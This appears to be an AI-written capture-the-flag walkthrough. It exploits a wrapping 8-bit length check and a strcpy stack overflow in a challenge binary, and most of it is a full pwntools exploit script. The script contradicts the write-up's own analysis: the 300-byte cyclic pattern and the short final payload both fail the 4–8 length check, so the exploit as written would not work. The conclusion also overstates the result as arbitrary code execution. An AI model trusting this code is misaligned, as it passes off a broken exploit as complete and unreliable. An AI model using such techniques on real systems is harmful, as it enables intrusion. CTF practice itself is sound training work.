To solve this challenge using pwntools, we'll perform a buffer overflow attack to overwrite the return address and redirect execution to the `what_is_this()` function, which prints the flag.

Here's how you can approach the problem step by step:

---

**Step 1: Analyze the Vulnerability**

1. **Understanding the `login()` function:**

   - The program reads your username and password.
   - For the password, it reads up to `0x199` (409) bytes into `buf`, which is an array of 512 bytes. So there's no buffer overflow here.
   - It then calls `check_passwd(buf);` with your input.

2. **Understanding the `check_passwd()` function:**

   ```c
   char *__cdecl check_passwd(char *s)
   {
     char dest[11]; // [esp+4h] [ebp-14h] BYREF
     unsigned __int8 v3; // [esp+Fh] [ebp-9h]

     v3 = strlen(s);
     if ( v3 <= 3u || v3 > 8u )
     {
       puts("Invalid Password");
       return (char *)fflush(stdout);
     }
     else
     {
       puts("Success");
       fflush(stdout);
       return strcpy(dest, s);
     }
   }
   ```

   - It calculates the length of your input `s` and stores it in an **unsigned 8-bit integer** `v3`.
   - If the length is between 4 and 8 (inclusive), it copies your input into `dest`, which is only 11 bytes.
   - However, since `v3` is an 8-bit integer, if you input a password longer than 255 bytes, `v3` will overflow due to integer overflow.

3. **Exploiting the Integer Overflow and Buffer Overflow:**

   - If you input a password of length **260 bytes**, `v3 = 260 % 256 = 4`, which passes the length check.
   - Then, `strcpy(dest, s);` copies your 260-byte input into `dest[11]`, causing a buffer overflow.
   - This overflow allows us to overwrite the function's return address on the stack.

4. **Redirecting Execution to `what_is_this()`:**

   - After overwriting the return address with the address of `what_is_this()`, when `check_passwd()` returns, it will jump to `what_is_this()` instead of the normal flow.
   - The `what_is_this()` function then executes `system("cat flag");`, which will print the flag.

**Step 2: Determine the Offset to the Return Address**

We need to find out how many bytes to send to overwrite the return address precisely. We'll use pwntools' cyclic patterns to find this offset.

---

**Step 3: Write the Exploit Code Using Pwntools**

Here's the complete exploit script:

```python
from pwn import *

# Set the architecture context
context(arch='i386', os='linux')

# Load the ELF binary
elf = ELF('./int')

# Get the address of the what_is_this function
what_is_this = elf.symbols['what_is_this']
log.info(f'Address of what_is_this: {hex(what_is_this)}')

# Start the process
p = process('./int')

# Interact with the menu to select "1. Login"
p.recvuntil('Your choice:')
p.sendline('1')

# Input username
p.recvuntil('Please input your username:')
p.sendline('user')

# Input password
p.recvuntil('Please input your passwd:')

# Create a cyclic pattern of 300 bytes to find the offset
payload = cyclic(300)

# Send the payload
p.sendline(payload)

# Wait for the process to crash and generate a core dump
p.wait()

# Load the core dump
core = p.corefile

# Extract the crashing EIP value
eip_value = core.eip
log.info(f'Crashing EIP: {hex(eip_value)}')

# Find the offset to EIP using cyclic_find
offset = cyclic_find(eip_value)
log.info(f'Offset to EIP: {offset}')

# Now build the final payload
payload = b'A' * offset
payload += p32(what_is_this)

# Re-run the process after crash
p = process('./int')

# Interact with the menu to select "1. Login"
p.recvuntil('Your choice:')
p.sendline('1')

# Input username
p.recvuntil('Please input your username:')
p.sendline('user')

# Input password
p.recvuntil('Please input your passwd:')

# Send the final payload
p.sendline(payload)

# Interact with the process to read the flag
p.interactive()
```

---

**Explanation:**

- **Import pwntools and Set Context:**

  ```python
  from pwn import *

  # Set the architecture context
  context(arch='i386', os='linux')
  ```

- **Load the Binary and Get Function Address:**

  ```python
  # Load the ELF binary
  elf = ELF('./int')

  # Get the address of the what_is_this function
  what_is_this = elf.symbols['what_is_this']
  log.info(f'Address of what_is_this: {hex(what_is_this)}')
  ```

- **Start the Process and Navigate the Menu:**

  ```python
  # Start the process
  p = process('./int')

  # Interact with the menu to select "1. Login"
  p.recvuntil('Your choice:')
  p.sendline('1')

  # Input username
  p.recvuntil('Please input your username:')
  p.sendline('user')

  # Input password
  p.recvuntil('Please input your passwd:')
  ```

- **Create a Cyclic Pattern to Find the Offset:**

  ```python
  # Create a cyclic pattern of 300 bytes to find the offset
  payload = cyclic(300)

  # Send the payload
  p.sendline(payload)
  ```

- **Wait for the Crash and Extract EIP:**

  ```python
  # Wait for the process to crash and generate a core dump
  p.wait()

  # Load the core dump
  core = p.corefile

  # Extract the crashing EIP value
  eip_value = core.eip
  log.info(f'Crashing EIP: {hex(eip_value)}')
  ```

- **Find the Offset Using `cyclic_find`:**

  ```python
  # Find the offset to EIP using cyclic_find
  offset = cyclic_find(eip_value)
  log.info(f'Offset to EIP: {offset}')
  ```

- **Build the Final Payload:**

  ```python
  # Now build the final payload
  payload = b'A' * offset
  payload += p32(what_is_this)
  ```

- **Re-run the Process and Send the Payload:**

  ```python
  # Re-run the process after crash
  p = process('./int')

  # Interact with the menu to select "1. Login"
  p.recvuntil('Your choice:')
  p.sendline('1')

  # Input username
  p.recvuntil('Please input your username:')
  p.sendline('user')

  # Input password
  p.recvuntil('Please input your passwd:')

  # Send the final payload
  p.sendline(payload)
  ```

- **Get the Flag:**

  ```python
  # Interact with the process to read the flag
  p.interactive()
  ```

**Step 4: Run the Exploit and Retrieve the Flag**

1. **Ensure the Binary is Executable:**

   - Make sure that the binary `int` is in the same directory as your exploit script and is executable.
   - If not, give it execute permissions using `chmod +x int`.

2. **Run the Exploit Script:**

   ```bash
   python exploit.py
   ```

3. **Get the Flag:**

   - The script will execute the binary, navigate through the menu, and send the payload.
   - Upon successful exploitation, you should see the flag printed to the console.

---

**Additional Notes:**

- **Core Dumps Enabled:**

  - Ensure that core dumps are enabled on your system to allow pwntools to generate and analyze them.
  - On Linux, you can enable core dumps with the following command:

    ```bash
    ulimit -c unlimited
    ```

- **Handling ASLR and NX Protections:**

  - If the binary has Address Space Layout Randomization (ASLR) or Non-Executable (NX) protections enabled, additional steps are required.
  - For this challenge, we assume these protections are not in place.

- **Understanding the Exploit:**

  - By overwriting the return address with the address of `what_is_this()`, we control the execution flow.
  - When `check_passwd()` returns, it will jump to `what_is_this()` instead of the normal flow.
  - This is a classic buffer overflow exploit.

---

**Conclusion:**

By carefully analyzing the program's behavior and exploiting the integer overflow vulnerability in `check_passwd()`, we crafted an input that allows us to overwrite the return address and execute arbitrary code. Using pwntools simplifies the process of building and sending the payload, as well as interacting with the binary.
